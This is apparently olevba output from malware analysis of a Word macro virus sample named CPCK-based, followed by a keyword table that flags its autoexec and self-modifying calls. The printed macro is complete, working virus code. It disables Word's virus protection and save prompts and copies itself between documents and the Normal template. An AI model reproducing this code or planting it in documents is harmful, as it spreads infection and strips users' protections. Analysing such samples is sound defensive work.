olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-35fc820e53575f336471ca7033c2e293aa7750ab
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-35fc820e53575f336471ca7033c2e293aa7750ab - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

On Error Resume Next

Options.VirusProtection = 0

OP46 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

Application.EnableCancelKey = 0

Options.ConfirmConversions = 0

AT93 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

Options.SaveNormalPrompt = 0

If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set IR14 = ActiveDocument.VBProject.VBComponents.Item(1)

MB88 = True

End If

If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set IR14 = NormalTemplate.VBProject.VBComponents.Item(1)

SH83 = True

End If

If SH83 <> True And MB88 <> True Then GoTo MU50

If SH83 = True Then IR14.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, OP46 - 1))

If MB88 = True Then IR14.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, AT93 - 1))

With IR14.CodeModule

For x = 2 To (IR14.CodeModule.CountOfLines - 1) Step 2

.replaceline x, "'" & Application.UserInitials & Application.ActiveWindow

Next x

End With

MU50:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

